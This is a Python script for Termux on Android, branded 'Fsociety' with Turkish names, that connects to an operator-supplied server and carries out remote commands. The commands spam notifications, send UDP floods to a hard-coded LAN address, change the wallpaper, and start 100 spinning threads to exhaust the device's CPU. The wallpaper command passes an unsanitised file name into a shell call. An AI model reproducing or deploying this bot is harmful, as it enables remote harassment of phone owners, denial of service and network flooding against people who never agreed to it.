
import socket
import os
import time
import threading

try:
    import termux
except ImportError:
    os.system("pip install termux")

from termux import Notification

def bildirim_spam():
    for i in range(10):
        os.system(f'termux-notification --title "Fsociety" --content "Bildirim {i+1}"')
        time.sleep(0.5)

def udp_spam():
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    hedef_ip = "192.168.1.100"
    hedef_port = 80
    mesaj = b"Fsociety UDP Spam"
    for _ in range(100):
        sock.sendto(mesaj, (hedef_ip, hedef_port))

def arka_plan_degistir(dosya_adi):
    tam_yol = f"/sdcard/Download/{dosya_adi}"
    if os.path.exists(tam_yol):
        os.system(f"termux-wallpaper -f {tam_yol}")
        os.system('termux-toast -b green "Duvar kağıdı ayarlandı"')
    else:
        os.system('termux-toast -b red "Dosya bulunamadı"')

def yuk_bindir():
    def yük():
        while True:
            pass
    for _ in range(100):
        threading.Thread(target=yük, daemon=True).start()

s = socket.socket()
host = input("Sunucu IP >> ")
port = int(input("Port >> "))
s.connect((host, port))
print(f"[+] Bağlandı: {host}:{port}")

while True:
    try:
        komut = s.recv(1024).decode().strip()
        if komut == "exit":
            break
        elif komut == "bildirim-spam":
            bildirim_spam()
            s.send("[✓] Bildirim spam gönderildi.".encode())
        elif komut == "udp-spam":
            udp_spam()
            s.send("[✓] UDP paketleri gönderildi.".encode())
        elif komut.startswith("arka-plan "):
            dosya_adi = komut.split(" ", 1)[1]
            arka_plan_degistir(dosya_adi)
            s.send("[✓] Duvar kağıdı değiştirildi.".encode())
        elif komut == "yükle":
            yuk_bindir()
            s.send("[✓] Yükleme başlatıldı.".encode())
        else:
            s.send("[X] Bilinmeyen komut.".encode())
    except Exception as e:
        os.system(f'termux-toast -b red "{str(e)}"')
        break

s.close()
